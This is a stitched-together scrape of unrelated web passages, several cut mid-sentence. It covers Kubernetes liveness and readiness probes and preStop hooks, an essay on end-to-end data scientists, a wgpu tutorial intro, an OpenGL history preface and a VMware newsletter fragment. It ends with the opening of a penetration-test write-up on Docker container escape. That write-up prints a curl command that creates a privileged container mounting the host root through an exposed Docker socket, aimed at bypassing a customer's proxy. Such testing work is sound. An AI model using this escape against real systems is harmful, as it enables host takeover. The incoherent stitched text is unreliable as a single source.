<p>The following image shows our current architecture now we’re on Kuberbetes, again very high level. We have traefik and app Pods, each exposed with a Service (essentially a cluster of Pods and a policy allowing access to them). The traefik Service is exposed outside the cluster to allow incoming connections from the load balancer, and we make use of the Ingress resource to direct traffic destined for specific URLs to the app backend Service.</p>

<p><img src="https://sbg.technology/images/zero-downtime-kubernetes/kubernetes_architecture.png" alt=""></p>

<h2 id="how-kubernetes-handles-health-checks">How Kubernetes handles health checks</h2>

<p>Our health checks are defined as part of our Deployment manifest, for both traefik and the application. Initially we used the same health check endpoints as we had been using previously. Our manifest looked a little like this.</p>

<h3 id="traefik">traefik</h3>

<div><div><pre><code>livenessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 80
    scheme: HTTP
  initialDelaySeconds: 10
  periodSeconds: 5
readinessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 80
    scheme: HTTP
  periodSeconds: 5
</code></pre></div></div>

<h3 id="application">application</h3>

<div><div><pre><code>livenessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 8081
    scheme: HTTP
  initialDelaySeconds: 10
  periodSeconds: 5
readinessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 8081
    scheme: HTTP
  periodSeconds: 5
</code></pre></div></div>

<p>This seemed to work out alright. Our Pods were up and running when we expected them to be, and when we force stopped the application, the health check went bad and the Pod was deleted. It was at this point we started doing extensive performance testing of the application on this new platform. We noticed an issue with cold starts. It appeared that the first time a non-health check request was made to each application Pod, the response time was around <strong>six seconds</strong>. The was obviously a suboptimal situation, and another reason why we do lots of performance testing using production-like load profiles.</p>

<p>After this first slow response, the application was absolutely fine. Turns out that the application doesn’t compile its JavaScript components until the first page load.</p>

<h2 id="its-alive-but-is-it-ready">It’s alive, but is it ready?</h2>

<p>It’s almost as though the team that built Kubernetes knew this would be a thing, as they specifically define both a <code>livenessProbe</code> and a <code>readinessProbe</code> that can be applied to the Pods. Their <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">own documentation</a> explains the difference between the two:</p>

<ul>
  <li><strong>livenessProbe</strong> defines when to restart a container, e.g. the <code>/ping</code> endpoint returns a bad response</li>
  <li><strong>readinessProbe</strong> defines when a container is ready to start accepting traffic, e.g. a script has run to synchronise data in your stateful application</li>
</ul>

<p>In our case, we needed to change our <code>readinessProbe</code> to try and load the <code>/login</code> endpoint, and allow the application to be properly ready for accepting <strong>all</strong> traffic, not just health check traffic.</p>

<div><div><pre><code>readinessProbe:
  failureThreshold: 5
  httpGet:
    path: /login?client_id=auth_provider
    port: 8081
  initialDelaySeconds: 25
  periodSeconds: 10
  timeoutSeconds: 1
  successThreshold: 1
</code></pre></div></div>

<p>This was a great success. Each Pod took about 15 seconds longer to start, but that’s a small price to pay to be confident in the ability of the Pod to handle traffic straight away. We went back to our performance testing and low and behold… we still saw issues with dropped requests during an application release, or scale down of the Pods.</p>

<p>Something about how this application works did not appreciate the way in which Kubernetes was terminating it.</p>

<h2 id="let-me-down-gently">Let me down gently</h2>

<p>When Kubernetes decides that it needs to terminate a Pod (whether this be to evacuate a host, move things around for resource utilisation purposes, or just because there is change to the Deployment warranting the creation of new Pods) it sends a <code>SIGTERM</code> (graceful shutdown request) to PID 1 of the container and waits for up to thirty seconds. In our case, PID 1 was the <code>node</code> parent process.</p>

<p>Remember the way we used to stop the applications on Corbenetes? We’d cut them off from receiving new requests and then eventually stop the application itself. Because at a basic level there is no link in Kubernetes between the state of the application Pods, and the state of the traefik Pods, we can’t hide the application behind traefik any more.</p>

<p>Thankfully, we had a way around this. We could use the Kubernetes <a href="https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/">container hooks</a> to implement a PreStop hook to do something <em>before</em> Kubernetes attempts to stop the container. We knew that straight killing the <code>node</code> parent was bad, even if it was graceful, so we experimented with the best way to gracefully terminate the container.</p>

<div><div><pre><code>lifecycle:
  preStop:
    exec:
      command: [
        "sh", "-c", "sleep 2 &amp;&amp; kill -15 $(pidof node | awk '{print $1}') &amp;&amp; sleep 2"
      ]
</code></pre></div></div>

<p>We ended up with this PreStop hook, which waits a couple of seconds, then sends a <code>SIGTERM</code> to the <code>node</code> child process, before waiting for another couple of seconds.</p>

<p>We went back to our performance tests and it was smoother than the proverbial. No matter how aggressively we were terminating Pods and restarting Deployments (the quickest way to test a release without actually releasing), we saw absolutely no degradation in service whatsoever.</p>

<p>This was all fine and dandy, but it taught us an important lesson: even if you are moving from one container-based platform to another, there is no such thing as a lift-and-shift. Each of them have their own nuances that need to be addressed. Now we know that Kubernetes is our standard, and we know how to handle zero-downtime deployments for our applications, we can properly spec out work in future, and not spend days chasing our tail trying to work out why it doesn’t just work.</p>

            <p>Recently, I came across a <a href="https://www.reddit.com/r/datascience/comments/i48b5q/for_those_that_work_for_a_team_that_has_both_data/" target="_blank">Reddit thread</a> on the different roles in data science and machine learning: data scientist, decision scientist, product data scientist, data engineer, machine learning engineer, machine learning tooling engineer, AI architect, etc.</p>

<p>I found this <em>worrying</em>. It’s difficult to be effective when the data science process (problem framing, data engineering, ML, deployment/maintenance) is split across different people. It leads to coordination overhead, diffusion of responsibility, and lack of a big picture view.</p>

<p>IMHO, <strong>I believe data scientists can be more effective by being end-to-end</strong>. Here, I’ll discuss the <a href="#from-start-identify-the-problem-to-finish-solve-it">benefits</a> and <a href="#but-we-need-specialist-experts-too">counter-arguments</a>, <a href="#the-best-way-to-pick-it-up-is-via-learning-by-doing">how to</a> become end-to-end, and the experiences of <a href="#end-to-end-in-stitch-fix-and-netflix">Stitch Fix and Netflix</a>.</p>

<h2 id="from-start-identify-the-problem-to-finish-solve-it">From start (identify the problem) to finish (solve it)</h2>

<p>You may have come across similar <em>labels</em> and definitions, such as:</p>
<ul>
  <li><a href="https://towardsdatascience.com/why-you-shouldnt-be-a-data-science-generalist-f69ea37cdd2c" target="_blank">Generalist</a>: Focused on roles (<a href="https://en.wikipedia.org/wiki/Product_manager" target="_blank">PM</a>, <a href="https://en.wikipedia.org/wiki/Business_analyst" target="_blank">BA</a>, <a href="https://www.oreilly.com/content/data-engineering-a-quick-and-simple-definition/" target="_blank">DE</a>, <a href="https://en.wikipedia.org/wiki/Category:Data_scientists" target="_blank">DS</a>, <a href="https://www.quora.com/What-exactly-does-a-machine-learning-engineer-do" target="_blank">MLE</a>); some negative connotation</li>
  <li><a href="https://skillcrush.com/blog/front-end-back-end-full-stack/" target="_blank">Full-stack</a>: Focused on tech (Spark, Torch, Docker); popularized by full-stack devs</li>
  <li><a href="https://www.infoworld.com/article/3429185/stop-searching-for-that-data-science-unicorn.html" target="_blank">Unicorn</a>: Focused on mythology; believed not to exist</li>
</ul>

<p>I find these definitions to be more prescriptive than I prefer. Instead, I have a simple (and pragmatic) definition: An end-to-end data scientist can <strong>identify and solve problems with data, to deliver value</strong>. To achieve the goal, they’ll wear as many (or as little) hats as required. They’ll also learn and apply whatever tech, methodology, and process that works. Throughout the process, they ask questions such as:</p>
<ul>
  <li>What is the problem? Why is it important?</li>
  <li>Can we solve it? How should we solve it?</li>
  <li>What is the estimated value? What was the actual value?</li>
</ul>

<details><summary>Data Science Processes</summary>
<div>
<p>Another way of defining end-to-end data science is via processes. These processes are usually complex and I’ve left them out of the main discussion. Nonetheless, here are a few in case you’re curious:</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Cross-industry_standard_process_for_data_mining" target="_blank">CRISP-DM</a>: Cross-Industry Standard Process for Data Mining (1997).</li>
  <li><a href="https://en.wikipedia.org/wiki/Data_mining#Process" target="_blank">KDD</a>: Knowledge Discovery in Databases.</li>
  <li><a href="https://docs.microsoft.com/en-us/azure/machine-learning/team-data-science-process/overview" target="_blank">TDSP</a>: Team Data Science Process, proposed by Microsoft in 2018.</li>
  <li><a href="https://github.com/dslp/dslp" target="_blank">DSLP</a>: Data Science Lifecycle Process.</li>
</ul>

<p>Don’t worry if these processes seem heavy and overwhelming. You don’t have to adopt them wholesale—start bit by bit, keep what works and adapt the rest.</p>
</div>

</details>

<h2 id="more-context-faster-iteration-greater-satisfaction">More context, faster iteration, greater satisfaction</h2>

<p>For most data science roles, being more end-to-end improves your ability to make meaningful impact. (Nonetheless, there are <a href="https://nvidia.wd5.myworkdayjobs.com/en-US/NVIDIAExternalCareerSite/job/US-CA-Santa-Clara/Senior-Deep-Learning-Data-Scientist--RAPIDS---AI_JR1929838" target="_blank">roles</a> that focus on machine learning.)</p>

<p><strong>Working end-to-end provides increased context.</strong> While specialized roles can increase efficiency, it reduces context (for the data scientist) and leads to suboptimal solutions.</p>

<blockquote>
  <p>The trick to forgetting the big picture is to look at everything close-up. – Chuck Palahniuk</p>
</blockquote>

<p>It’s hard to design a holistic solution without full context of the upstream problem. Let’s say conversion has decreased and a PM raises a request to improve our search algorithm. However, what’s causing the decrease in the first place? There could be various causes:</p>
<ul>
  <li>Product: Is fraudulent/poor quality product reducing customer trust?</li>
  <li>Data pipelines: Has data quality been compromised or are there delays/outages?</li>
  <li>Model refresh: Is the model not refreshing regularly/correctly?</li>
</ul>

<p>More often than not, the problem—and solution—lies <em>outside</em> of machine learning. A solution to <em>improve the algorithm</em> would miss the root cause.</p>

<p>Similarly, it’s risky to develop a solution without awareness of downstream engineering and product constraints. There’s no point:</p>
<ul>
  <li>Building a near-real time recommender if infra and engineer cannot support it</li>
  <li>Building an infinite scroll recommender if it doesn’t fit in our product and app</li>
</ul>

<p>By working end-to-end, data scientists will have the full context to identify the right problems and develop usable solutions. It can also lead to innovative ideas that specialists, with their narrow context, might miss. Overall, it increases the ability to deliver value.</p>

<p><strong>Communication and coordination overhead is reduced.</strong> With multiple roles comes additional overhead. Let’s look at an example of a data engineer (DE) cleaning the data and creating features, a data scientist (DS) analysing the data and training the model, and a machine learning engineer (MLE) deploying and maintaining it.</p>

<blockquote>
  <p>What one programmer can do in one month, two programmers can do in two months. – Frederick P. Brooks</p>
</blockquote>

<p>The DE and DS need to <em>communicate</em> on what data is (and is not) available, how it should be cleaned (e.g., outliers, normalisation), and which features should be created. Similarly, the DS and MLE have to discuss how to deploy, monitor, and maintain the model, as well as how often it should be refreshed. When issues occur, we’ll need three people in the room (likely with a PM) to triage the root cause and next steps to fix it.</p>

<p>It also leads to additional coordination, where schedules need to be aligned as work is executed and passed along in a sequential approach. If the DS wants to experiment with additional data and features, we’ll need to wait for the DE to ingest the data and create the features. If a new model is ready for A/B testing, we’ll need to wait for the MLE to (convert it to production code) and deploy it.</p>

<p>While the actual development work may take days, the communication back-and-forth and coordination can take weeks, if not longer. With end-to-end data scientists, we can minimize this overhead as well as prevent technical details from being lost in translation.</p>

<p>(But, can an end-to-end DS really do all that? I think so. While the DS might not be as proficient in some tasks as a DE or MLE, they will be able to perform most tasks effectively. If they need help with scaling or hardening, they can always get help from specialist DEs and MLEs.)</p>

<details><summary>The Cost of Communication and Coordination</summary>
<div>
<p>Richard Hackman, a Harvard psychologist, showed that the number of relationships in a team is <code><span>N</span><span>(</span><span>N</span><span>-</span><span>1</span><span>)</span> <span>/</span> <span>2</span></code>, where <code><span>N</span></code> is the number of people. This leads to exponential growth in links, where:</p>

<ul>
  <li>A start-up team of 7 has 21 links to maintain</li>
  <li>A group of 21 (i.e., three start-up teams) has 210 links</li>
  <li>A group of 63 has almost 2,000 links.</li>
</ul>

<p>In our simple example, we only had three roles (i.e., six links). But as a PM, BA, and additional members are included, this leads to greater than linear growth in communication and coordination costs. Thus, while each additional member increases total team productivity, the increased overhead means productivity grows at a decreasing rate. (Amazon’s <a href="https://buffer.com/resources/small-teams-why-startups-often-win-against-google-and-facebook-the-science-behind-why-smaller-teams-get-more-done/" target="_blank">two-pizza teams</a> are a possible solution to this.)</p>
</div>
</details>

<p><strong>Iteration and learning rate is increased.</strong> With greater context and lesser overhead, we can now iterate, fail (read: learn), and deliver value faster.</p>

<p>This is especially important for developing data and algorithmic products. Unlike software engineering (a far more mature craft), we can’t do all the learning and design before we start building—our blueprints, architectures, and design patterns are not as developed. Thus, rapid iteration is essential for the design-build-learn cycle.</p>

<p><strong>There’s greater ownership and accountability.</strong> Having the data science process split across multiple people can lead to diffusion of responsibility, and worse, social loafing.</p>

<p>A common anti-pattern observed is “<a href="https://wiki.c2.com/?ThrownOverTheWall" target="_blank">throw over the wall</a>”. For example, the DE creates features and throws a database table to the DS, the DS trains a model and throws <code>R</code> code over to the MLE, and the MLE translates it to <code>Java</code> to production.</p>

<p>If things get lost-in-translation or if results are unexpected, who is responsible? With a strong culture of ownership, everyone steps up to contribute in their respective roles. But without it, work can degenerate into ass-covering and finger-pointing while the issue persists and customers and the business suffers.</p>

<p>Having the end-to-end data scientist take ownership and responsibility for the entire process can mitigate this. They should be empowered to take action from start to finish, from the customer problem and input (i.e., raw data) to the output (i.e., deployed model) and measurable outcomes.</p>

<details><summary>Diffusion of Responsibilty &amp; Social Loafing</summary>
<div>

<p><a href="https://en.wikipedia.org/wiki/Diffusion_of_responsibility" target="_blank">Diffusion of responsibility</a>: We are less likely to take responsibility and act when there are others present. Individuals feel less responsibility and urgency to help if we know that there are others also watching the situation. </p>

<p>One form of this is the <a href="https://en.wikipedia.org/wiki/Diffusion_of_responsibility#Bystander_effect" target="_blank">Bystander effect</a>, where <a href="https://en.wikipedia.org/wiki/Murder_of_Kitty_Genovese" target="_blank">Kitty Genovese</a> was stabbed outside the apartment building across the street from where she lived. While there were 38 witnesses who saw or heard the attack, none called the police or helped her.</p>

<p><a href="https://en.wikipedia.org/wiki/Social_loafing" target="_blank">Social loafing</a>: We exert less effort when we work in a group vs. working alone. In the 1890s, Ringelmann made people pull on ropes both separately and in groups. He measured how hard they pulled and found that members of a group tended to exert less effort in pulling a rope than did individuals alone.</p>

</div>
</details>

<p><strong>For (some) data scientists, it can lead to increased motivation and job satisfaction</strong>, which is <a href="https://www.clearpointstrategy.com/how-employees-are-motivated-autonomy-mastery-purpose/" target="_blank">closely tied</a> to autonomy, mastery, and purpose.</p>
<ul>
  <li><strong>Autonomy:</strong> By being able to solve problems independently. Instead of waiting and depending on others, end-to-end data scientists are able to identify and define the problem, build their own data pipelines, and deploy and validate a solution.</li>
  <li><strong>Mastery:</strong> In the problem, solution, outcome from end-to-end. They can also pick up the domain and tech as required.</li>
  <li><strong>Purpose</strong>: By being deeply involved in the entire process, they have a more direct connection with the work and outcomes, leading to an increased sense of <em>purpose</em>.</li>
</ul>

<h2 id="but-we-need-specialist-experts-too">But, we need specialist experts too</h2>

<p>Being end-to-end is not for everyone (and every team) though, for reasons such as:</p>

<p><strong>Wanting to specialize</strong> in machine learning, or perhaps a specific niche in machine learning such as neural text generation (read: <a href="https://mc.ai/the-subtle-art-of-priming-gpt-3/" target="_blank">GPT-3 primer</a>). While being end-to-end is valuable, we also need such world-class experts in research and industry who push the envelope. Much of what we have in ML came from academia and pure research efforts.</p>

WebGPU is a specification published by the GPU for the Web Community Group. It aims to allow web code access to GPU functions in a safe and reliable manner. It does this by mimicking the Vulkan API, and translating that down to whatever API the host hardware is using (ie. DirectX, Metal, Vulkan).</p> <p>Wgpu is still in development, so some of this doc is subject to change.</p> <h2 id="why-rust"><a href="#why-rust">#</a> Why Rust?</h2> <p>Wgpu actually has C bindings to allow you to write C/C++ code with it, as well as use other languages that interface with C. That being said, wgpu is written in Rust, and it has some convient Rust Bindings that don't have to jump through any hoops. On top of that, I've been enjoying writing in Rust.</p> <p>You should be fairly familiar with Rust before using this tutorial as I won't go into much detail on Rust syntax. If you're not super comfortable with Rust you can review the <a href="https://www.rust-lang.org/learn" target="_blank" rel="noopener noreferrer">Rust tutorial</a>. You should also be familiar about <a href="https://doc.rust-lang.org/cargo/" target="_blank" rel="noopener noreferrer">Cargo</a>.</p> <p>I'm using this project as a way to learn wgpu myself, so I might miss some important details, or explain things wrong.

<p>On the most fundamental level, OpenGL is a software interface that allows a
programmer to communicate with graphics hardware. Of course, there is much more
to it than that, and you will be glad to know that this book explains the finer
details of OpenGL. But before we get our hands dirty and start coding, you'll
need to know a little about the history of Computer Graphics and OpenGL.</p>

<p>In the preface we'll explore the following topics:
* The inception of computers and computer graphics
* What OpenGL is and how it came to be
* How computer graphics work
* Hardware and software requirements for this book</p>

<div>
  <p><strong>Attention:</strong></p><p>
    If you want to get straight into graphics programming without reading this
    lengthy history, you may skip straight to the "requirements" section below,
    read it, and start the next chapter. I have to stress, however, that having
    a thorough understanding of the history of computing, computer graphics,
    and OpenGL can be important in understanding future developments.
  </p>
</div>



<p>Whether through writing, painting, or body language, imaging has always been an
important player in relaying information and chronicling history. The
requirement for visual feedback is so important that it is hard to acknowledge
the existence of something if you cannot see it. Bacteria, for instance, were
purely speculative before their visual discovery in the seventeenth century by
Antonie van Leeuwenhoek who invented the microscope, but became an integral
part of modern science.</p>

<p>Computer data is represented in nothing more than electrical pulses, which are
also invisible to the naked eye. A method of displaying this data had to be
invented, so early computer scientists would get visual feedback from their
machines through a series of lamps mounted onto boards or long perforated paper
tapes, so called "punch cards."</p>

<p>As you can imagine, this information was far from readable and much
interpretation was required to convert the information into a human-readable
format. And even though computers were eventually equipped with electric
typewriters, the output was far from optimal.</p>

<h2>Display: Cathode Ray Tubes</h2>

<p><img src="https://openglbook.com/images/Ferdinand_Braun.jpg" title="Ferdinand Braun, inventor of the Cathode Ray Tube" alt="Ferdinand Braun, inventor of the Cathode Ray Tube"></p>

<p>In 1897, Ferdinand Braun invented the CRT (Cathode Ray Tube) in Germany as a
type of vacuum tube whose purpose was to display an image onto a screen. You
may have seen or used them yourself in the form of glass-tube televisions and
computer monitors that were the norm until very recently.</p>

<p>CRTs were already being used for television and oscilloscope output, but
nobody had thought of combining this technology with computers. The first time
they were used to display computer output was in 1951 at MIT (the Massachusetts
Institute of Technology) where the Whirlwind computer was developed as a United
States Navy flight simulator. CRTs allowed the operators to instantly see the
output of a computer program without having to interpret punch cards, rows of
lamps or sort through reams of printouts.</p>

<p>While the Whirlwind project itself wasn't very successful due to high operating
cost, it was an important step into the direction of computer graphics by
introducing the CRT as a viable computer output device. The CRT became an
important player in the development of computer graphics, and remained the
output device of choice for over 50 years until it was replaced by newer
flat panel technologies.</p>

<h2>The First Interactions</h2>

<p><img src="https://openglbook.com/images/Sutherland_Lightpen-300x220.jpg" title="The light pen used with Sketchpad (Source: 1)" alt="The light pen used with Sketchpad (Source: 1)"></p>

<p>Though CRTs allowed computers to display their output, it was mostly text that
was simply meant to read out the computer's current state. This remained true
for some time since no one thought of the computer in any other fashion than a
pure computational device. It was not until 1961 when Ivan Sutherland developed
a computer program called Sketchpad for his thesis at MIT that would change the
way we look at computers dramatically.</p>

<p>Sutherland's Sketchpad program allowed users to draw geometrical shapes onto a
CRT with a light pen in real-time, something that was groundbreaking at the
time and remains remarkable even many years after. It not only defined computer
graphics, but also introduced the precursor of a GUI (pronounced "gooey," which
stands for Graphic User Interface) and laid the foundations of what was to
become a concept known as Object Oriented Programming. Sketchpad created a
paradigm shift in that computers were no longer simply number crunching
devices, but could also be used to display geometric shapes.</p>

<div>
  <p><strong>FYI: Real-Time Computer Graphics</strong></p><p>
    Real-time computer graphics are generated on the fly, and usually in
    response to the user's input from a mouse, keyboard, or any other input
    device. Real-time graphics are often applied in applications such as video
    games and design programs.
  </p>
</div>

<p>In 1968, Ivan Sutherland and Bob Sproull engineered another technological feat,
namely "The Sword of Damocles," the forerunner of what we now call virtual
reality. This system displayed simple three-dimensional wireframe models to the
user through a headset, suspended from a ceiling because of its weight. This in
itself may have been one of the first (if not the first) time a form of 3D
graphics were generated by a computer.</p>

<h2>Smaller, Faster, Cheaper</h2>

<p>Of course, technology didn't just jump from punch cards to interactive
graphics; computers gradually evolved from massive machines to the small
devices that you use every day.</p>

<p><img src="https://openglbook.com/images/Eniac-300x229.jpg" title="Eniac, a famous first generation computer (Source: 2)" alt="Eniac, a famous first generation computer (Source: 2)"></p>

<p>From the 1940s to the mid-1950s, computers used vacuum tubes for processing and
would take up entire rooms. A vacuum tube is a device that can modify an
electronic signal in some way or another, such as switching, which is a
function that is imperative to computing. The components required to assemble a
computer were big and ran hot to the touch. None of the machines built during
this era were the same, and thus, their programs were not compatible with any
other machine. This era is usually referred to as the <strong>first generation</strong> of
computers and represents the first step in modern computer science. These are
the machines mentioned in the first section that used punch cards and lamps as
output devices, so they contributed little to the development of computer
graphics.</p>

<p>Transistors started to replace vacuum tubes during the mid 1950s, creating the
smaller, faster, cheaper, and more energy efficient computers of the <strong>second
generation</strong>. Transistors not only allowed for the creation of smaller
computers due to their small size, but ushered in a whole new generation of
consumer electronics as well. Radios, for example, could now be powered by
batteries and carried around, whereas before they were heavy stationary boxes.</p>

<p>But transistors themselves were not the Holy Grail for computing, and in the
mid-1960s, a new technology called the Integrated Circuit brought forth the
<strong>third generation</strong> of computers. Integrated Circuits miniaturized a certain
function that would normally have been performed by a series of individual
transistors onto a single chip. During the third generation, many computers
were being equipped with devices such as the keyboard, monitors, and a new type
of software called the Operating System, which allowed the computer to run
multiple programs. An important Operating System from this era was called UNIX,
which would influence many (if not all) following developments in Operating
Systems.</p>

<p><img src="https://openglbook.com/images/Intel-4004-300x157.jpg" title="The Intel 4004 Microprocessor -- the little chip that started it all (Source: 3)" alt="The Intel 4004 Microprocessor -- the little chip that started it all (Source: 3)"></p>

<p>In 1971, a major breakthrough in the field of computing occurred with the
invention of the microprocessor by the Intel Corporation, ushering in the
<strong>fourth generation</strong> of computers. Whereas CPUs (Central Processing Units)
normally were boards with many Integrated Circuits soldered onto it, the
Intel's 4004 microprocessor contained all of this functionality on a single
chip. Because of a cheaper production process, the computer slowly transitioned
from being a specialized device used by large companies and governments to
something much more accessible to the masses. We are currently still in the
fourth generation of computers, since we have not yet moved away from microprocessors.</p>

<h2>Personal Computing</h2>

<p><img src="https://openglbook.com/images/Apple_II-300x264.png" title="The Apple II Plus (1979) showing color display capabilities (Source: 4)" alt="The Apple II Plus (1979) showing color display capabilities (Source: 4)"></p>

<p>The first Personal Computers started to appear in the mid to late 1970s, but
were regarded as enthusiast machines for hobbyists. This changed somewhat with
the release of the Apple II by Apple Computer in 1977, and the PET by Commodore
International. These machines popularized the concept of computers for the
home, but did not have too much to offer in terms of computer graphics.</p>

<p>This somewhat changed in the 1980s when technologies such as GUI were
introduced to the personal computing market. The first dedicated graphics
add-on cards also started to appear during this era, notably the CGA (Color
Graphics Adapter) by IBM was the first color graphics card for the IBM PC
platform, which would pave the way for future developments by standardizing a
method of drawing computer graphics but didn't offer much in terms of graphics
capabilities.</p>

<p>During the 1970s and 1980s, most video games ran on specialized systems, movies
made use of computer animation only sparsely, and real-time 3D graphics were
for visualization purposes only since there was no consumer hardware that was
fast enough. These years were known for their many firsts on consumer hardware,
but it wasn't until the late 1980s to the early 1990s when computer games took
a strong hold on the PC platform and a real push for better looking and better
performing real-time graphics began.</p>

<p>One of the computer games that pushed what was possible on the hardware of the
day was Wolfenstein 3D, a first-person shooter released in 1992 by id Software.
While Wolfenstein wasn't truly 3D it defined the standard for future 3D
computer games. Only a year later, id Software released Doom, their first true
3D game. For the first time, the player could explore their environment through
the use of staircases and elevators, without being stuck to a certain
elevation. Many games followed that imitated the look and feel of Doom, and
were aptly dubbed "Doom-clones." Doom used a software …</p></div></div>

A few Kubernetes contributors are jumping ship from VMware. Four in a little over a week is nothing short of a sign, though. These aren’t the kinds of folks who like to hang out in big corporate orgs and feel like cogs in the machine. They want to feel like they’re making an impact and see the value in their work. They, like Deming, appreciate and take pride in their work. There is nothing at all wrong with this. I 100% understand, given that Red Hat is the biggest organization I’ve ever been a part of outside the Air Force. I can understand the appeal of the late-stage startup life too.</p><p>But, there is comfort in working for a 25-year-old organization inside a much larger organization that probably won’t muck with us too much given the current global situation. VMware completely sucked all the Heptio out of Heptio the second they started renaming and rebranding Heptio projects to VMware products. I have to hand it to Red Hat. Realizing that the CoreOS name meant something and keeping some of its projects active and incorporating the CoreOS name into products shows that at the very least, Red Hat appreciated CoreOS’s work. I don’t know if the same can be said for VMware of Heptio. Perception is often reality in these instances because we’ll never know otherwise unless folks speak up (which they are often not allowed to).</p><p><strong>DevOps’ish is brought to you by</strong> <a href="https://www.accurics.com/?utm_source=newsletter&amp;utm_medium=email&amp;utm_campaign=devopsish_181"><strong>Accurics</strong></a>.

<p>Legend has it that before his death, Harry Houdini once said: “<em>if it is truly possible for someone to return from the afterlife, I will</em>”. Despite of the fact he was a great illusionist and escape artist, it seems this last proof has revealed to be very hard, even for him. Much simpler trying to escape out of a container. Of course a docker container 🙂 … our topic for today.</p>



<p>The danger of exposing “<code>docker.sock</code>” to a docker container is well-known and the security literature is full of examples (one is <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">here</a>) leading to container escape and privilege escalation issues in the host machine. But sometimes this is required (if not even necessary) for legitimate purposes, like creating other containers or pushing configuration settings. While the docker security guidelines advocate to not share the Docker UNIX socket inside a container, at the same time the project developers do not give any advice on how to secure such a kind of configuration whenever it is needed for “<em>good reasons</em>”. And that’s why so many companies that adopt docker and deliver services based on it, still today, suffer from this problem.</p>



<p>For example, last year a customer of us has contracted a security firm to check the robustness of their docker infrastructure. One of their main findings was the file “<code>docker.sock</code>” being mounted within some of their containers, which of course was a sufficient condition to compromise the entire host operating system. In the absence of a strong solution coming from the community, our customer has decided to build its own solution. They created a reverse proxy in front of the Docker UNIX socket file that would add authentication/authorization, and would prevent insecure utilization of the Docker socket itself.</p>



<p>Then they asked us to test the new architecture. This is the story of how the sympathetic Red Timmy has managed to bypass it.</p>



<h3>The architecture</h3>



<p>Before moving forward, we must explain a bit the implementation we have been called to test and a picture should make the job easy enough.</p>



<figure><img loading="lazy" width="1024" height="511" src="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png" alt="" srcset="https://www.redtimmy.com/wp-content/uploads/2020/08/docker-1024x511.png 1024w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-300x150.png 300w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker-768x383.png 768w, https://www.redtimmy.com/wp-content/uploads/2020/08/docker.png 1099w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>In this architecture there are two UNIX socket files now:</p>



<ul><li><code>/var/run/docker.sock</code> is not exposed within the docker containers anymore. It is readable and writable only for the “<code>root</code>” user and the “<code>docker</code>” group. As you already know the docker engine uses it directly.</li><li><code>/var/run/somethingelse.sock</code> is instead the resource exposed within the docker containers. The file is created in order to be readable and writable only by an unprivileged user which is not part of the docker group. In this way the process creating it does not own enough access rights to read and write directly into “<code>/var/run/docker.sock</code>”. The docker engine remains the only one able to do that.</li></ul>



<p>Then a reverse proxy, running as a privileged user, sits in the middle of these two UNIX socket files. It fetches requests from “<code>/var/run/somethingelse.sock</code>” and determines whether or not these must be forwarded to “<code>/var/run/docker.sock</code>” based on a whitelist of authorized values preemptively saved in a configuration file. For example, a request could be let pass through only if it matches a specific HTTP method (<em>GET</em>, <em>POST</em>, etc…), path (for example “<code>/containers/create</code>”) and/or JSON body.</p>



<p>At the same way the reverse proxy returns the replies from “<code>docker.sock</code>” to “<code>somethingelse.sock</code>” once they are in the pipeline. At first glance the workflow looked fine and flawless.</p>



<h3>Let the dance begin</h3>



<p>Ok, all clear. We have been provided with access to a docker container:</p>



<div><div>
<div><p><code>[root@dockerhost ~]# <strong>docker exec -it 7c4e2742becb bash</strong><br>bash-4.4$</code> &lt;-- container command prompt</p></div>
</div></div>







<p>Also our handsome UNIX socket file is where it is supposed to be:</p>



<p><code>bash-4.4$ <strong>ls –al /var/run/somethingelse.sock</strong><br>srw-------  1 unpriv root 0 Feb 13 11:31 somethingelse.sock</code></p>



<p>Now we must find a way to escape out of there. First thing we try is to leverage the “old” trick as documented in the report that our customer has received from the security firm they had originally contracted:</p>



<p><code>bash-4.4$ curl –i –s <em>–-unix-socket /<u>var/run/somethingelse.sock</u></em> –X POST –H ‘Content-Type: application/json’ –data-binary ‘{<strong>"</strong>Hostname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>Domainname<strong>"</strong>: <strong>""</strong>,<strong>"</strong>User<strong>"</strong>: <strong>""</strong>,<strong>"</strong>AttachStdin<strong>"</strong>: true,<strong> "</strong>AttachStdout<strong>"</strong>: true,<strong> "</strong>AttachStderr<strong>"</strong>: true,<strong> "</strong>Tty<strong>"</strong>: true,<strong>"</strong>OpenStdin<strong>"</strong>: true,<strong>"</strong>StdinOnce<strong>"</strong>: true,<strong>"</strong>Entrypoint<strong>"</strong>: <strong>"</strong>/bin/bash”,”Image<strong>"</strong>: <strong>"</strong>dockerint.company.com/xxx/imagename:1.0.0-SNAPSHOT<strong>"</strong>,<strong>"</strong>Volumes<strong>"</strong>: {<strong>"</strong>/hostos/<strong>"</strong>: {}}, <strong>"</strong>HostConfig<strong>"</strong>: {<strong>"Binds": ["/:/hostos"]</strong>, <strong>"</strong>Privileged<strong>"</strong>: true}}’ http://localhost<strong>/containers/create</strong></code></p>



<p>The main difference in our command is that instead of establishing a communication channel with “<code>/var/run/docker.sock</code>” (not mounted in the container) we target “<code>/var/run/somethingelse.sock</code>” (which is instead mounted in the container). All the hacking steps are performed with curl. Specifically, as we are communicating with a UNIX domain socket, the “<code>--unix-socket &lt;filename&gt;</code>” option is adopted.</p>



<p>The command above is the same (a bit extended) as specified in the section “<strong><em>Create the container with the mounted volume</em>” </strong>of this online <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank" rel="noreferrer noopener">tutorial</a>, which the penetration tester had linked into his report. I strongly suggest you to read that post before going ahead with this one, if you are not familiar with the technique in general. Anyway, even if you are not familiar, below follows a short explanation of what we were trying to do with that command.</p>



